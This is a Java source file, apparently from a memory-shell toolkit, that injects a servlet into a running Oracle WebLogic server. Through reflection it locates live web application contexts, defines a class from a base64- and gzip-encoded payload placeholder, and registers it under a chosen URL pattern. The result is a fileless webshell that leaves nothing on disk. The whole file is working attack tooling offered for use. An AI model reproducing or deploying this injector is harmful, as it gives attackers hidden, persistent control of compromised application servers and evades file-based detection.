package com.reajason.javaweb.memshell.injector.weblogic;

import javax.management.MBeanServer;
import javax.servlet.Servlet;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class WebLogicServletInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public WebLogicServletInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts == null || contexts.isEmpty()) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    inject(context, shell);
                    msg += "[" + getUrlPattern() + "] ready\n";
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        ok = true;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(context, "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }


    /**
     * weblogic.servlet.internal.WebAppServletContext
     * /opt/oracle/wls1036/server/lib/weblogic.jar
     * /u01/oracle/wlserver/modules/com.oracle.weblogic.servlet.jar
     */
    public static Set<Object> getContext() throws Exception {
        Set<Object> webappContexts = new HashSet<Object>();
        MBeanServer platformMBeanServer = ManagementFactory.getPlatformMBeanServer();
        Map<String, Object> objectsByObjectName = (Map<String, Object>) getFieldValue(platformMBeanServer, "objectsByObjectName");
        for (Map.Entry<String, Object> entry : objectsByObjectName.entrySet()) {
            String key = entry.getKey();
            if (key.contains("Type=WebAppComponentRuntime")) {
                Object value = entry.getValue();
                Object managedResource = getFieldValue(value, "managedResource");
                if (managedResource != null && managedResource.getClass().getSimpleName().equals("WebAppRuntimeMBeanImpl")) {
                    webappContexts.add(getFieldValue(managedResource, "context"));
                }
            }
        }
        try {
            Object workEntry = getFieldValue(Thread.currentThread(), "workEntry");
            Object request = null;
            try {
                Object connectionHandler = getFieldValue(workEntry, "connectionHandler");
                request = getFieldValue(connectionHandler, "request");
            } catch (Exception x) {
                // WebLogic 10.3.6
                request = workEntry;
            }
            if (request != null) {
                webappContexts.add(getFieldValue(request, "context"));
            }
        } catch (Throwable ignored) {
        }
        return webappContexts;
    }

    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            return ((ClassLoader) getFieldValue(context, "classLoader"));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        try {
            return classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            return clazz.newInstance();
        }
    }

    /**
     * server/lib/weblogic.jar
     * weblogic.servlet.internal.WebAppServletContext
     */
    public void inject(Object context, Object servlet) throws Exception {
        // weblogic.servlet.utils.URLMapping
        Object servletMapping = invokeMethod(context, "getServletMapping", null, null);
        Class<?> webAppServletContextClass = context.getClass();
        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        Class<?> servletStubImplClass = contextClassLoader.loadClass("weblogic.servlet.internal.ServletStubImpl");
        Object servletStub = null;
        Constructor<?> servletStubImplConstructor = null;
        try {
            servletStubImplConstructor = servletStubImplClass.getDeclaredConstructor(String.class, Servlet.class, webAppServletContextClass);
            servletStubImplConstructor.setAccessible(true);
            servletStub = servletStubImplConstructor.newInstance(getClassName(), servlet, context);
        } catch (NoSuchMethodException e) {
            // 10.3.6
            servletStubImplConstructor = servletStubImplClass.getDeclaredConstructor(String.class, String.class, webAppServletContextClass, Map.class);
            servletStubImplConstructor.setAccessible(true);
            servletStub = servletStubImplConstructor.newInstance(getClassName(), getClassName(), context, null);
        }
        Constructor<?> urlMatchHelperConstructor = contextClassLoader.loadClass("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, servletStubImplClass);
        urlMatchHelperConstructor.setAccessible(true);
        Object urlMatchHelper = urlMatchHelperConstructor.newInstance(getUrlPattern(), servletStub);
        Object mapping = invokeMethod(servletMapping, "get", new Class[]{String.class}, new Object[]{getUrlPattern()});
        if (mapping == null) {
            invokeMethod(servletMapping, "put", new Class[]{String.class, Object.class}, new Object[]{getUrlPattern(), urlMatchHelper});
        }
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = obj.getClass();
        Method method = clazz.getDeclaredMethod(methodName, paramClazz);
        method.setAccessible(true);
        return method.invoke(obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
